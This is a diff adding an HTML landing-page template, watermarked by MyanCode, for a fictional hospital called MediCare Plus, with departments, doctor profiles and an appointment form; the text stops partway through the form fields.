@@ -1,0 +1,4052 @@
+<!doctype html>
+<html lang="en" class="scroll-smooth">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="robots" content="noarchive,nosnippet" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <title>MediCare Plus — World-Class Healthcare</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600;700;800&family=Plus+Jakarta+Sans:wght@300;400;500;600&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --primary: #0a6e5c;
+        --primary-light: #0e9b82;
+        --accent: #f0a500;
+        --bg: #f8faf9;
+        --dark: #081c18;
+        --card: #ffffff;
+        --border: #d4e8e2;
+        --muted: #5a7a72;
+        --hero-grad: linear-gradient(
+          135deg,
+          #0a6e5c 0%,
+          #0e9b82 60%,
+          #1bb89a 100%
+        );
+      }
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+      body {
+        font-family: "Plus Jakarta Sans", sans-serif;
+        background: var(--bg);
+        color: var(--dark);
+        overflow-x: hidden;
+      }
+      h1,
+      h2,
+      h3,
+      h4,
+      .font-display {
+        font-family: "Playfair Display", serif;
+      }
+      .text-primary {
+        color: var(--primary);
+      }
+      .bg-primary {
+        background: var(--primary);
+      }
+      .border-primary {
+        border-color: var(--primary);
+      }
+      .watermark-fixed {
+        position: fixed;
+        bottom: 18px;
+        right: 22px;
+        z-index: 9999;
+        font-family: "Plus Jakarta Sans", sans-serif;
+        font-size: 11px;
+        font-weight: 600;
+        letter-spacing: 0.06em;
+        color: rgba(10, 110, 92, 0.55);
+        background: rgba(255, 255, 255, 0.85);
+        border: 1px solid rgba(10, 110, 92, 0.2);
+        border-radius: 999px;
+        padding: 5px 12px;
+        pointer-events: none;
+        user-select: none;
+        backdrop-filter: blur(8px);
+      }
+      .watermark-hero {
+        position: absolute;
+        bottom: 24px;
+        right: 28px;
+        font-family: "Plus Jakarta Sans", sans-serif;
+        font-size: 10px;
+        font-weight: 700;
+        letter-spacing: 0.12em;
+        text-transform: uppercase;
+        color: rgba(255, 255, 255, 0.35);
+        user-select: none;
+        pointer-events: none;
+      }
+      nav {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        z-index: 100;
+        transition: all 0.3s;
+      }
+      nav.scrolled {
+        background: rgba(255, 255, 255, 0.94);
+        backdrop-filter: blur(20px);
+        box-shadow: 0 1px 0 rgba(0, 0, 0, 0.07);
+      }
+      .btn-primary {
+        background: var(--primary);
+        color: #fff;
+        font-family: "Plus Jakarta Sans", sans-serif;
+        font-weight: 600;
+        padding: 0.8rem 2rem;
+        border-radius: 10px;
+        transition: all 0.2s;
+        display: inline-block;
+        cursor: pointer;
+        border: none;
+      }
+      .btn-primary:hover {
+        background: var(--primary-light);
+        transform: translateY(-2px);
+        box-shadow: 0 8px 24px rgba(10, 110, 92, 0.3);
+      }
+      .btn-outline {
+        border: 2px solid var(--primary);
+        color: var(--primary);
+        font-family: "Plus Jakarta Sans", sans-serif;
+        font-weight: 600;
+        padding: 0.75rem 1.8rem;
+        border-radius: 10px;
+        transition: all 0.2s;
+        display: inline-block;
+        cursor: pointer;
+        background: transparent;
+      }
+      .btn-outline:hover {
+        background: var(--primary);
+        color: #fff;
+      }
+      .btn-white {
+        background: #fff;
+        color: var(--primary);
+        font-family: "Plus Jakarta Sans", sans-serif;
+        font-weight: 700;
+        padding: 0.85rem 2.2rem;
+        border-radius: 10px;
+        transition: all 0.2s;
+        display: inline-block;
+        cursor: pointer;
+      }
+      .btn-white:hover {
+        background: #e8f5f1;
+        transform: translateY(-2px);
+      }
+      .btn-outline-white {
+        border: 2px solid rgba(255, 255, 255, 0.6);
+        color: #fff;
+        font-family: "Plus Jakarta Sans", sans-serif;
+        font-weight: 600;
+        padding: 0.8rem 1.8rem;
+        border-radius: 10px;
+        transition: all 0.2s;
+        display: inline-block;
+        cursor: pointer;
+      }
+      .btn-outline-white:hover {
+        background: rgba(255, 255, 255, 0.15);
+      }
+      .card {
+        background: #fff;
+        border: 1px solid var(--border);
+        border-radius: 16px;
+        transition: all 0.25s;
+      }
+      .card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 20px 50px rgba(10, 110, 92, 0.12);
+        border-color: rgba(10, 110, 92, 0.2);
+      }
+      .icon-circle {
+        width: 54px;
+        height: 54px;
+        border-radius: 50%;
+        background: rgba(10, 110, 92, 0.08);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+      }
+      .reveal {
+        opacity: 0;
+        transform: translateY(28px);
+        transition:
+          opacity 0.65s ease,
+          transform 0.65s ease;
+      }
+      .reveal.visible {
+        opacity: 1;
+        transform: translateY(0);
+      }
+      .stat-badge {
+        background: rgba(255, 255, 255, 0.15);
+        backdrop-filter: blur(12px);
+        border: 1px solid rgba(255, 255, 255, 0.25);
+        border-radius: 14px;
+        padding: 1rem 1.5rem;
+      }
+      .dept-card {
+        background: #fff;
+        border-radius: 16px;
+        border: 1px solid var(--border);
+        overflow: hidden;
+        transition: all 0.3s;
+        cursor: pointer;
+      }
+      .dept-card:hover {
+        box-shadow: 0 16px 48px rgba(10, 110, 92, 0.14);
+        transform: translateY(-4px);
+        border-color: var(--primary-light);
+      }
+      .dept-icon-wrap {
+        height: 80px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 12px;
+        margin-bottom: 1rem;
+      }
+      .doctor-card {
+        background: #fff;
+        border-radius: 20px;
+        border: 1px solid var(--border);
+        overflow: hidden;
+        transition: all 0.3s;
+      }
+      .doctor-card:hover {
+        box-shadow: 0 20px 60px rgba(10, 110, 92, 0.15);
+        transform: translateY(-6px);
+      }
+      .doctor-avatar {
+        width: 100%;
+        height: 180px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 3.5rem;
+      }
+      .faq-answer {
+        max-height: 0;
+        overflow: hidden;
+        transition:
+          max-height 0.4s ease,
+          padding 0.4s ease;
+      }
+      .faq-answer.open {
+        max-height: 300px;
+        padding-top: 0.75rem;
+      }
+      .input-field {
+        background: #f0f7f5;
+        border: 1.5px solid var(--border);
+        border-radius: 10px;
+        color: var(--dark);
+        padding: 0.75rem 1.1rem;
+        width: 100%;
+        font-family: "Plus Jakarta Sans", sans-serif;
+        font-size: 0.95rem;
+        transition: border-color 0.2s;
+        outline: none;
+      }
+      .input-field:focus {
+        border-color: var(--primary);
+        background: #fff;
+      }
+      .input-field::placeholder {
+        color: var(--muted);
+      }
+      select.input-field {
+        appearance: none;
+        cursor: pointer;
+      }
+      .divider {
+        height: 1px;
+        background: linear-gradient(
+          90deg,
+          transparent,
+          var(--border),
+          transparent
+        );
+      }
+      .pill {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.4rem;
+        border: 1.5px solid rgba(10, 110, 92, 0.2);
+        background: rgba(10, 110, 92, 0.06);
+        color: var(--primary);
+        font-size: 0.72rem;
+        font-weight: 700;
+        letter-spacing: 0.1em;
+        text-transform: uppercase;
+        padding: 0.3rem 0.9rem;
+        border-radius: 999px;
+      }
+      @keyframes pulse-ring {
+        0% {
+          transform: scale(1);
+          opacity: 0.6;
+        }
+        70% {
+          transform: scale(1.5);
+          opacity: 0;
+        }
+        100% {
+          transform: scale(1.5);
+          opacity: 0;
+        }
+      }
+      .pulse-dot {
+        position: relative;
+        display: inline-block;
+      }
+      .pulse-dot::before {
+        content: "";
+        position: absolute;
+        inset: -6px;
+        border-radius: 50%;
+        background: rgba(10, 110, 92, 0.3);
+        animation: pulse-ring 2s ease infinite;
+      }
+      @keyframes float {
+        0%,
+        100% {
+          transform: translateY(0);
+        }
+        50% {
+          transform: translateY(-10px);
+        }
+      }
+      .float-anim {
+        animation: float 4s ease-in-out infinite;
+      }
+      ::-webkit-scrollbar {
+        width: 6px;
+      }
+      ::-webkit-scrollbar-track {
+        background: var(--bg);
+      }
+      ::-webkit-scrollbar-thumb {
+        background: var(--border);
+        border-radius: 3px;
+      }
+    </style>
+  </head>
+  <body>
+    <style>
+      #_mcDemo {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        pointer-events: none;
+        z-index: 99998;
+        overflow: hidden;
+      }
+      #_mcDemo::before {
+        content: "</> MyanCode";
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%) rotate(-35deg);
+        font-size: clamp(3rem, 8vw, 7rem);
+        font-weight: 900;
+        letter-spacing: 0.15em;
+        color: rgba(10, 110, 92, 0.06);
+        white-space: nowrap;
+        user-select: none;
+        font-family: sans-serif;
+      }
+      #_mcWm {
+        position: fixed;
+        bottom: 18px;
+        right: 22px;
+        z-index: 99999;
+        font-size: 11px;
+        font-weight: 700;
+        letter-spacing: 0.06em;
+        color: rgba(10, 110, 92, 0.7);
+        background: rgba(255, 255, 255, 0.9);
+        border: 1px solid rgba(10, 110, 92, 0.25);
+        border-radius: 999px;
+        padding: 5px 14px;
+        pointer-events: none;
+        user-select: none;
+        backdrop-filter: blur(8px);
+        font-family: sans-serif;
+      }
+    </style>
+    <div id="_mcDemo"></div>
+    <div id="_mcWm">&#169; Created by MyanCode</div>
+    <div class="watermark-fixed">Created by MyanCode</div>
+    <nav id="navbar" class="px-6 py-4">
+      <div class="max-w-7xl mx-auto flex items-center justify-between">
+        <a href="#" class="flex items-center gap-2.5"
+          ><div
+            class="w-9 h-9 rounded-xl flex items-center justify-center text-white font-bold text-lg"
+            style="background: var(--primary)"
+          >
+            ✦
+          </div>
+          <span class="font-display font-700 text-xl" style="color: var(--dark)"
+            >Medi<span class="text-primary">Care</span
+            ><span style="color: var(--accent)">+</span></span
+          ></a
+        >
+        <ul
+          class="hidden md:flex items-center gap-7 text-sm font-medium"
+          style="color: var(--muted)"
+        >
+          <li>
+            <a href="#departments" class="hover:text-primary transition-colors"
+              >Departments</a
+            >
+          </li>
+          <li>
+            <a href="#doctors" class="hover:text-primary transition-colors"
+              >Doctors</a
+            >
+          </li>
+          <li>
+            <a href="#services" class="hover:text-primary transition-colors"
+              >Services</a
+            >
+          </li>
+          <li>
+            <a href="#appointment" class="hover:text-primary transition-colors"
+              >Appointments</a
+            >
+          </li>
+          <li>
+            <a href="#faq" class="hover:text-primary transition-colors">FAQ</a>
+          </li>
+        </ul>
+        <div class="hidden md:flex items-center gap-3">
+          <a
+            href="tel:+18005550100"
+            class="text-sm font-600 flex items-center gap-1.5 text-primary"
+            >📞 1-800-555-0100</a
+          ><a href="#appointment" class="btn-primary text-sm"
+            >Book Appointment</a
+          >
+        </div>
+        <button id="menuBtn" class="md:hidden p-2 flex flex-col gap-1.5">
+          <span class="w-6 h-0.5 rounded" style="background: var(--dark)"></span
+          ><span
+            class="w-6 h-0.5 rounded"
+            style="background: var(--dark)"
+          ></span
+          ><span
+            class="w-6 h-0.5 rounded"
+            style="background: var(--dark)"
+          ></span>
+        </button>
+      </div>
+      <div
+        id="mobileMenu"
+        class="md:hidden hidden flex-col gap-3 px-4 pb-5 pt-2 text-sm font-medium"
+        style="
+          color: var(--muted);
+          background: #fff;
+          border-top: 1px solid var(--border);
+        "
+      >
+        <a
+          href="#departments"
+          class="py-2 border-b hover:text-primary"
+          style="border-color: var(--border)"
+          >Departments</a
+        ><a
+          href="#doctors"
+          class="py-2 border-b hover:text-primary"
+          style="border-color: var(--border)"
+          >Doctors</a
+        ><a
+          href="#services"
+          class="py-2 border-b hover:text-primary"
+          style="border-color: var(--border)"
+          >Services</a
+        ><a
+          href="#appointment"
+          class="py-2 border-b hover:text-primary"
+          style="border-color: var(--border)"
+          >Appointments</a
+        ><a href="#faq" class="py-2 hover:text-primary">FAQ</a
+        ><a href="#appointment" class="btn-primary text-center mt-2 block"
+          >Book Appointment</a
+        >
+      </div>
+    </nav>
+    <section
+      class="relative min-h-screen flex items-center pt-20 pb-16 px-6 overflow-hidden"
+      style="background: var(--hero-grad)"
+    >
+      <div
+        style="
+          position: absolute;
+          inset: 0;
+          background: url(&quot;data:image/svg+xml,%3Csvg width=60 height=60 viewBox=0 0 60 60 xmlns=http://www.w3.org/2000/svg%3E%3Cg fill=none fill-rule=evenodd%3E%3Cg fill=%23ffffff opacity=.04%3E%3Cpath d=M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z/%3E%3C/g%3E%3C/g%3E%3C/svg%3E&quot;);
+          opacity: 0.4;
+        "
+      ></div>
+      <div class="max-w-7xl mx-auto w-full relative z-10">
+        <div class="grid md:grid-cols-2 gap-12 items-center">
+          <div>
+            <div
+              class="pill mb-5 reveal"
+              style="
+                border-color: rgba(255, 255, 255, 0.3);
+                background: rgba(255, 255, 255, 0.12);
+                color: #fff;
+              "
+            >
+              🏥 Accredited Excellence Since 1984
+            </div>
+            <h1
+              class="text-5xl md:text-6xl font-800 text-white leading-tight mb-5 reveal"
+              style="transition-delay: 0.1s"
+            >
+              Your Health,<br /><span style="color: rgba(255, 255, 255, 0.75)"
+                >Our</span
+              >
+              Mission.
+            </h1>
+            <p
+              class="text-lg mb-8 reveal"
+              style="
+                color: rgba(255, 255, 255, 0.8);
+                line-height: 1.75;
+                transition-delay: 0.2s;
+                max-width: 480px;
+              "
+            >
+              World-class medical care delivered with compassion. From emergency
+              services to advanced surgeries — we are with you every step of the
+              way.
+            </p>
+            <div
+              class="flex flex-wrap gap-4 mb-10 reveal"
+              style="transition-delay: 0.3s"
+            >
+              <a href="#appointment" class="btn-white">Book Appointment →</a
+              ><a href="#departments" class="btn-outline-white"
+                >Our Departments</a
+              >
+            </div>
+            <div
+              class="flex flex-wrap gap-5 reveal"
+              style="transition-delay: 0.4s"
+            >
+              <div class="stat-badge text-center">
+                <div class="font-display text-3xl font-800 text-white">40+</div>
+                <div
+                  class="text-xs mt-0.5"
+                  style="color: rgba(255, 255, 255, 0.7)"
+                >
+                  Departments
+                </div>
+              </div>
+              <div class="stat-badge text-center">
+                <div class="font-display text-3xl font-800 text-white">
+                  850+
+                </div>
+                <div
+                  class="text-xs mt-0.5"
+                  style="color: rgba(255, 255, 255, 0.7)"
+                >
+                  Specialists
+                </div>
+              </div>
+              <div class="stat-badge text-center">
+                <div class="font-display text-3xl font-800 text-white">98%</div>
+                <div
+                  class="text-xs mt-0.5"
+                  style="color: rgba(255, 255, 255, 0.7)"
+                >
+                  Success Rate
+                </div>
+              </div>
+              <div class="stat-badge text-center">
+                <div class="font-display text-3xl font-800 text-white">
+                  24/7
+                </div>
+                <div
+                  class="text-xs mt-0.5"
+                  style="color: rgba(255, 255, 255, 0.7)"
+                >
+                  Emergency
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="hidden md:flex justify-center items-center">
+            <div class="relative float-anim">
+              <div
+                style="
+                  width: 340px;
+                  height: 340px;
+                  border-radius: 50%;
+                  background: rgba(255, 255, 255, 0.1);
+                  border: 2px solid rgba(255, 255, 255, 0.2);
+                  display: flex;
+                  align-items: center;
+                  justify-content: center;
+                "
+              >
+                <div
+                  style="
+                    width: 270px;
+                    height: 270px;
+                    border-radius: 50%;
+                    background: rgba(255, 255, 255, 0.12);
+                    border: 1.5px solid rgba(255, 255, 255, 0.18);
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                  "
+                >
+                  <div
+                    style="
+                      width: 200px;
+                      height: 200px;
+                      border-radius: 50%;
+                      background: rgba(255, 255, 255, 0.18);
+                      display: flex;
+                      align-items: center;
+                      justify-content: center;
+                      font-size: 5rem;
+                    "
+                  >
+                    🏥
+                  </div>
+                </div>
+              </div>
+              <div
+                class="absolute -top-4 -right-4"
+                style="
+                  background: #fff;
+                  border-radius: 14px;
+                  padding: 0.75rem 1.1rem;
+                  box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
+                "
+              >
+                <div class="flex items-center gap-2">
+                  <div
+                    class="pulse-dot w-2 h-2 rounded-full"
+                    style="background: #22c55e"
+                  ></div>
+                  <span class="text-xs font-700 text-primary"
+                    >Emergency Open</span
+                  >
+                </div>
+              </div>
+              <div
+                class="absolute -bottom-2 -left-8"
+                style="
+                  background: #fff;
+                  border-radius: 14px;
+                  padding: 0.75rem 1.2rem;
+                  box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
+                "
+              >
+                <div class="text-xs font-700 text-primary mb-0.5">
+                  Today's Appointments
+                </div>
+                <div
+                  class="font-display text-2xl font-800"
+                  style="color: var(--dark)"
+                >
+                  128
+                  <span class="text-sm font-normal" style="color: var(--muted)"
+                    >scheduled</span
+                  >
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="watermark-hero">Created by MyanCode</div>
+    </section>
+    <section
+      class="py-5 px-6"
+      style="background: #fff; border-bottom: 1px solid var(--border)"
+    >
+      <div class="max-w-6xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-0">
+        <div
+          class="flex items-center gap-3 py-4 px-6 border-r"
+          style="border-color: var(--border)"
+        >
+          <span class="text-2xl">🚑</span>
+          <div>
+            <div
+              class="text-xs font-700 text-primary uppercase tracking-widest"
+            >
+              Emergency
+            </div>
+            <div class="text-sm font-600" style="color: var(--dark)">
+              24 / 7 Available
+            </div>
+          </div>
+        </div>
+        <div
+          class="flex items-center gap-3 py-4 px-6 border-r"
+          style="border-color: var(--border)"
+        >
+          <span class="text-2xl">💊</span>
+          <div>
+            <div
+              class="text-xs font-700 text-primary uppercase tracking-widest"
+            >
+              Pharmacy
+            </div>
+            <div class="text-sm font-600" style="color: var(--dark)">
+              In-House & Delivery
+            </div>
+          </div>
+        </div>
+        <div
+          class="flex items-center gap-3 py-4 px-6 border-r"
+          style="border-color: var(--border)"
+        >
+          <span class="text-2xl">🔬</span>
+          <div>
+            <div
+              class="text-xs font-700 text-primary uppercase tracking-widest"
+            >
+              Laboratory
+            </div>
+            <div class="text-sm font-600" style="color: var(--dark)">
+              Same-Day Results
+            </div>
+          </div>
+        </div>
+        <div class="flex items-center gap-3 py-4 px-6">
+          <span class="text-2xl">📱</span>
+          <div>
+            <div
+              class="text-xs font-700 text-primary uppercase tracking-widest"
+            >
+              Telemedicine
+            </div>
+            <div class="text-sm font-600" style="color: var(--dark)">
+              Video Consult
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section id="departments" class="py-24 px-6">
+      <div class="max-w-6xl mx-auto">
+        <div class="text-center mb-14">
+          <div class="pill mb-4 reveal">Departments</div>
+          <h2
+            class="text-4xl md:text-5xl font-800 text-primary mb-3 reveal"
+            style="transition-delay: 0.1s"
+          >
+            Specialized Care<br />Across Every Field
+          </h2>
+          <p
+            class="max-w-xl mx-auto text-sm reveal"
+            style="
+              color: var(--muted);
+              line-height: 1.8;
+              transition-delay: 0.2s;
+            "
+          >
+            Our hospital brings together the world's best specialists under one
+            roof — delivering precision medicine with a human touch.
+          </p>
+        </div>
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-5">
+          <div class="dept-card p-6 text-center reveal">
+            <div
+              class="dept-icon-wrap"
+              style="background: rgba(239, 68, 68, 0.08)"
+            >
+              <span class="text-4xl">❤️</span>
+            </div>
+            <h3 class="font-700 text-sm mb-1">Cardiology</h3>
+            <p class="text-xs" style="color: var(--muted)">
+              Heart & Vascular Care
+            </p>
+          </div>
+          <div
+            class="dept-card p-6 text-center reveal"
+            style="transition-delay: 0.05s"
+          >
+            <div
+              class="dept-icon-wrap"
+              style="background: rgba(59, 130, 246, 0.08)"
+            >
+              <span class="text-4xl">🧠</span>
+            </div>
+            <h3 class="font-700 text-sm mb-1">Neurology</h3>
+            <p class="text-xs" style="color: var(--muted)">
+              Brain & Nerve Disorders
+            </p>
+          </div>
+          <div
+            class="dept-card p-6 text-center reveal"
+            style="transition-delay: 0.1s"
+          >
+            <div
+              class="dept-icon-wrap"
+              style="background: rgba(168, 85, 247, 0.08)"
+            >
+              <span class="text-4xl">🦴</span>
+            </div>
+            <h3 class="font-700 text-sm mb-1">Orthopedics</h3>
+            <p class="text-xs" style="color: var(--muted)">
+              Bones, Joints & Spine
+            </p>
+          </div>
+          <div
+            class="dept-card p-6 text-center reveal"
+            style="transition-delay: 0.15s"
+          >
+            <div
+              class="dept-icon-wrap"
+              style="background: rgba(236, 72, 153, 0.08)"
+            >
+              <span class="text-4xl">👶</span>
+            </div>
+            <h3 class="font-700 text-sm mb-1">Pediatrics</h3>
+            <p class="text-xs" style="color: var(--muted)">Children's Health</p>
+          </div>
+          <div
+            class="dept-card p-6 text-center reveal"
+            style="transition-delay: 0.2s"
+          >
+            <div
+              class="dept-icon-wrap"
+              style="background: rgba(245, 158, 11, 0.08)"
+            >
+              <span class="text-4xl">🫁</span>
+            </div>
+            <h3 class="font-700 text-sm mb-1">Pulmonology</h3>
+            <p class="text-xs" style="color: var(--muted)">
+              Lungs & Respiratory
+            </p>
+          </div>
+          <div
+            class="dept-card p-6 text-center reveal"
+            style="transition-delay: 0.25s"
+          >
+            <div
+              class="dept-icon-wrap"
+              style="background: rgba(20, 184, 166, 0.08)"
+            >
+              <span class="text-4xl">🦷</span>
+            </div>
+            <h3 class="font-700 text-sm mb-1">Dental</h3>
+            <p class="text-xs" style="color: var(--muted)">
+              Complete Oral Care
+            </p>
+          </div>
+          <div
+            class="dept-card p-6 text-center reveal"
+            style="transition-delay: 0.3s"
+          >
+            <div
+              class="dept-icon-wrap"
+              style="background: rgba(6, 182, 212, 0.08)"
+            >
+              <span class="text-4xl">👁️</span>
+            </div>
+            <h3 class="font-700 text-sm mb-1">Ophthalmology</h3>
+            <p class="text-xs" style="color: var(--muted)">
+              Eye Care & Surgery
+            </p>
+          </div>
+          <div
+            class="dept-card p-6 text-center reveal"
+            style="transition-delay: 0.35s"
+          >
+            <div
+              class="dept-icon-wrap"
+              style="background: rgba(10, 110, 92, 0.08)"
+            >
+              <span class="text-4xl">🩺</span>
+            </div>
+            <h3 class="font-700 text-sm mb-1">Oncology</h3>
+            <p class="text-xs" style="color: var(--muted)">Cancer Treatment</p>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section
+      id="services"
+      class="py-24 px-6"
+      style="background: linear-gradient(180deg, #f0f7f5, #fff)"
+    >
+      <div class="max-w-6xl mx-auto">
+        <div class="text-center mb-14">
+          <div class="pill mb-4 reveal">Why Choose Us</div>
+          <h2
+            class="text-4xl md:text-5xl font-800 text-primary mb-3 reveal"
+            style="transition-delay: 0.1s"
+          >
+            Healthcare That<br />Puts You First
+          </h2>
+        </div>
+        <div class="grid md:grid-cols-2 gap-8 mb-10">
+          <div class="card p-8 reveal">
+            <div class="icon-circle mb-5"><span class="text-2xl">🏆</span></div>
+            <h3 class="font-display text-xl font-700 mb-3">
+              Award-Winning Specialists
+            </h3>
+            <p class="text-sm" style="color: var(--muted); line-height: 1.8">
+              Our physicians are internationally trained, board-certified
+              experts recognized by leading medical bodies. Every case is
+              handled by the right specialist — no compromises.
+            </p>
+          </div>
+          <div class="card p-8 reveal" style="transition-delay: 0.1s">
+            <div class="icon-circle mb-5"><span class="text-2xl">⚡</span></div>
+            <h3 class="font-display text-xl font-700 mb-3">
+              Advanced Technology
+            </h3>
+            <p class="text-sm" style="color: var(--muted); line-height: 1.8">
+              From robotic surgery to AI-assisted diagnostics — we invest in the
+              latest medical technology so our patients receive the safest, most
+              accurate care possible.
+            </p>
+          </div>
+        </div>
+        <div class="grid md:grid-cols-3 gap-6">
+          <div class="card p-6 reveal">
+            <div class="icon-circle mb-4" style="width: 44px; height: 44px">
+              <span class="text-xl">🌍</span>
+            </div>
+            <h3 class="font-700 mb-2 text-sm">International Patients</h3>
+            <p class="text-xs" style="color: var(--muted); line-height: 1.7">
+              Dedicated coordinator, visa support, and multilingual staff for
+              global visitors.
+            </p>
+          </div>
+          <div class="card p-6 reveal" style="transition-delay: 0.1s">
+            <div class="icon-circle mb-4" style="width: 44px; height: 44px">
+              <span class="text-xl">🧪</span>
+            </div>
+            <h3 class="font-700 mb-2 text-sm">In-House Laboratory</h3>
+            <p class="text-xs" style="color: var(--muted); line-height: 1.7">
+              Same-day blood work, imaging, and biopsy results from our
+              accredited lab.
+            </p>
+          </div>
+          <div class="card p-6 reveal" style="transition-delay: 0.2s">
+            <div class="icon-circle mb-4" style="width: 44px; height: 44px">
+              <span class="text-xl">📱</span>
+            </div>
+            <h3 class="font-700 mb-2 text-sm">Patient Portal</h3>
+            <p class="text-xs" style="color: var(--muted); line-height: 1.7">
+              Access records, prescriptions, and lab results securely from your
+              phone.
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section id="doctors" class="py-24 px-6">
+      <div class="max-w-6xl mx-auto">
+        <div class="text-center mb-14">
+          <div class="pill mb-4 reveal">Our Doctors</div>
+          <h2
+            class="text-4xl md:text-5xl font-800 text-primary mb-3 reveal"
+            style="transition-delay: 0.1s"
+          >
+            Meet Our Specialists
+          </h2>
+          <p
+            class="max-w-lg mx-auto text-sm reveal"
+            style="
+              color: var(--muted);
+              transition-delay: 0.2s;
+              line-height: 1.8;
+            "
+          >
+            Board-certified physicians with decades of experience in their
+            fields.
+          </p>
+        </div>
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-6">
+          <div class="doctor-card reveal">
+            <div
+              class="doctor-avatar"
+              style="background: linear-gradient(135deg, #e8f5f1, #b8e4d8)"
+            >
+              👨‍⚕️
+            </div>
+            <div class="p-5">
+              <div
+                class="text-xs font-700 text-primary mb-1 uppercase tracking-widest"
+              >
+                Cardiology
+              </div>
+              <h3 class="font-display font-700 mb-1">Dr. James Harlow</h3>
+              <p class="text-xs mb-3" style="color: var(--muted)">
+                MD, FACC · 22 yrs exp.
+              </p>
+              <div
+                class="flex items-center gap-1 text-xs"
+                style="color: var(--accent)"
+              >
+                ★★★★★
+                <span style="color: var(--muted); margin-left: 4px">4.9</span>
+              </div>
+            </div>
+          </div>
+          <div class="doctor-card reveal" style="transition-delay: 0.1s">
+            <div
+              class="doctor-avatar"
+              style="background: linear-gradient(135deg, #ede9fe, #c4b5fd)"
+            >
+              👩‍⚕️
+            </div>
+            <div class="p-5">
+              <div
+                class="text-xs font-700 text-primary mb-1 uppercase tracking-widest"
+              >
+                Neurology
+              </div>
+              <h3 class="font-display font-700 mb-1">Dr. Aisha Patel</h3>
+              <p class="text-xs mb-3" style="color: var(--muted)">
+                MD, PhD · 18 yrs exp.
+              </p>
+              <div
+                class="flex items-center gap-1 text-xs"
+                style="color: var(--accent)"
+              >
+                ★★★★★
+                <span style="color: var(--muted); margin-left: 4px">5.0</span>
+              </div>
+            </div>
+          </div>
+          <div class="doctor-card reveal" style="transition-delay: 0.2s">
+            <div
+              class="doctor-avatar"
+              style="background: linear-gradient(135deg, #fef3c7, #fde68a)"
+            >
+              👨‍⚕️
+            </div>
+            <div class="p-5">
+              <div
+                class="text-xs font-700 text-primary mb-1 uppercase tracking-widest"
+              >
+                Orthopedics
+              </div>
+              <h3 class="font-display font-700 mb-1">Dr. Robert Kim</h3>
+              <p class="text-xs mb-3" style="color: var(--muted)">
+                MD, FAAOS · 15 yrs exp.
+              </p>
+              <div
+                class="flex items-center gap-1 text-xs"
+                style="color: var(--accent)"
+              >
+                ★★★★★
+                <span style="color: var(--muted); margin-left: 4px">4.8</span>
+              </div>
+            </div>
+          </div>
+          <div class="doctor-card reveal" style="transition-delay: 0.3s">
+            <div
+              class="doctor-avatar"
+              style="background: linear-gradient(135deg, #fce7f3, #f9a8d4)"
+            >
+              👩‍⚕️
+            </div>
+            <div class="p-5">
+              <div
+                class="text-xs font-700 text-primary mb-1 uppercase tracking-widest"
+              >
+                Pediatrics
+              </div>
+              <h3 class="font-display font-700 mb-1">Dr. Mei Tanaka</h3>
+              <p class="text-xs mb-3" style="color: var(--muted)">
+                MD, FAAP · 12 yrs exp.
+              </p>
+              <div
+                class="flex items-center gap-1 text-xs"
+                style="color: var(--accent)"
+              >
+                ★★★★★
+                <span style="color: var(--muted); margin-left: 4px">4.9</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section
+      id="appointment"
+      class="py-24 px-6"
+      style="background: linear-gradient(135deg, #f0f7f5, #e8f5f1)"
+    >
+      <div class="max-w-3xl mx-auto">
+        <div class="text-center mb-10">
+          <div class="pill mb-4 reveal">Appointments</div>
+          <h2
+            class="text-4xl font-800 text-primary mb-3 reveal"
+            style="transition-delay: 0.1s"
+          >
+            Book an Appointment
+          </h2>
+          <p
+            class="text-sm reveal"
+            style="color: var(--muted); transition-delay: 0.2s"
+          >
+            Fill in your details and our team will confirm within 2 hours.
+          </p>
+        </div>
+        <div class="card p-8 reveal" style="transition-delay: 0.2s">
+          <div class="grid md:grid-cols-2 gap-5">
+            <div>
+              <label
+                class="block text-xs font-700 uppercase tracking-widest mb-2"
+                style="color: var(--muted)"
+                >First Name</label
+              ><input type="text" class="input-field" placeholder="John" />
+            </div>
+            <div>
+              <label
+                class="block text-xs font-700 uppercase tracking-widest mb-2"
+                style="color: var(--muted)"
+                >Last Name</label
+              ><input type="text" class="input-field" placeholder="Doe" />
+            </div>
+            <div>
+              <label
+                class="block text-xs font-700 uppercase tracking-widest mb-2"
+                style="color: var(--muted)"
+                >Phone Number</label
+              ><input
+                type="tel"
+                class="input-field"
+                placeholder="+1 (555) 000-0000"
+              />
+            </div>
+            <div>
+              <label
+                class="block text-xs font-700 uppercase tracking-widest mb-2"
+                style="color: var(--muted)"
+                >Email Address</label
+              ><input
+                type="email"
+                class="input-field"
+                placeholder="john@email.com"
+              />
+            </div>
+            <div>
+              <label
+                class="block text-xs font-700 uppercase tracking-widest mb-2"
+                style="color: var(--muted)"
